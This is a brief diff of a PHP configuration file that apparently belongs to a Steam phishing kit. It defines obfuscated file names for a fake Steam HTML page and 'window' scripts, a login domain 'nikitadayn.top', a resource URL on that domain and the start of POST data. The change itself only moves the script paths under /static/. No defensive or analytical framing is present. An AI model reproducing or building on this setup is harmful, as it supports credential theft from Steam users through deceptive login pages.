@@ -2,8 +2,8 @@
 
 $phpName = "add2199bb8ec3c74c267be5969a6411d.php";
 $steamHtmlName = "txqmjgkxhzp5.html";
-$steamScriptName = "ndmkkcq6vc09.js";
-$windowScriptName = "vljvylnrdlf0.js";
+$steamScriptName = "/static/ndmkkcq6vc09.js";
+$windowScriptName = "/static/vljvylnrdlf0.js";
 $domainToLogin = "nikitadayn.top";
 $resourceUrl = "https://nikitadayn.top/f4qa88kinibw3xgibqll6thsihved0r6dw7fs";
 $postData = [
